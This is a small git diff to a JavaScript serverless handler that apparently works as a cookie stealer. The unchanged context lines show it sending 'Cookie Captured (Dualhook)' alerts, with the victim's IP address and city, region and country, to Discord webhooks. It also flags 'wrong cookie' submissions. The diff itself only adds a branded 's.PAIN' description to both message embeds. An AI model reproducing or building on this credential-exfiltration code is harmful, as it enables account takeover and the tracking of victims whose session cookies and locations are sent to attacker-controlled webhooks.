@@ -125,7 +125,8 @@ export default async function handler(req, res) {
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
     await Promise.all(webhooks.map(wh => discordSend(wh, {
       embeds: [{
-        title:  '⚠️ Wrong Cookie — Troll Detected',
+        title:       '⚠️ Wrong Cookie — Troll Detected',
+        description: '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
         color:  0xff3333,
         fields: [
           { name: '🌐 IP',       value: ip,                   inline: true  },
@@ -180,7 +181,8 @@ export default async function handler(req, res) {
     await discordSend(webhook1, {
       content: '@everyone',
       embeds: [{
-        title:     '🍪 Cookie Captured (Dualhook)',
+        title:       '🍪 Cookie Captured (Dualhook)',
+        description: '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
         color:     0x06b6d4,
         fields: [
           { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
